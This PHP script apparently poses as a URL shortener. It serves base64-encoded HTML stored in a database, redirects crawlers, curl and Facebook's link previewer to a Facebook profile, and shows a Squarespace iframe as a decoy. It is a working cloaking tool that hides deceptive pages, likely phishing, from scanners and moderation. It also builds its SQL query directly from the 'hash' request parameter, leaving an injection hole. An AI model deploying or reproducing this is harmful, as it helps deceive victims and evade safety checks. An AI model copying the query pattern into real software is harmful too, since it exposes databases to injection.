<?php
header('Content-Type:text/html');
require_once "./config.php";

$hash = $_GET['hash'];
$sql = "SELECT * FROM short_urls WHERE hash_url ='{$hash}'";
$query = $pdolite->query($sql);
$row_query = $query->fetch(PDO::FETCH_ASSOC);
$contentHTML = $row_query['html'] ?? null;


if(isset($contentHTML)) {
if (preg_match('/bot|crawl|curl|dataprovider|search|get|spider|find|java|majesticsEO|google|yahoo|teoma|contaxe|yandex|libwww-perl|facebookexternalhit|facebook(external)/i', $_SERVER['HTTP_USER_AGENT'])){
$short_urlx2 = "http://m.facebook.com/profile.php";
header("location: $short_urlx2", true, 200);
die();
}

else{
echo base64_decode($contentHTML);    
}
} 

else {
?>
<!DOCTYPE html><html xmlns:og="http://opengraphprotocol.org/schema/" xmlns:fb="http://www.facebook.com/2008/fbml" lang="es" class="region-www-styles"><head><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/x-icon" href="https://static1.es.squarespace.com/static/5134cbefe4b0c6fb04df8065/t/5be0b4d96d2a73f0ce4f95ff/favicon.ico"><link rel="apple-touch-icon" href="https://static1.es.squarespace.com/static/5134cbefe4b0c6fb04df8065/t/5be0b4d96d2a73f0ce4f95ff/favicon.ico"><title>URL Shortener</title><style type="text/css">iframe{border:none;margin:0;padding:0;height:100%;width:100%}body,html{padding:0;margin:0;height:100%;width:100%}</style></head><body><iframe src="https://es.squarespace.com/" scrolling="no" frameborder="0"></iframe></body></html></head></html>
<?php
}
?>
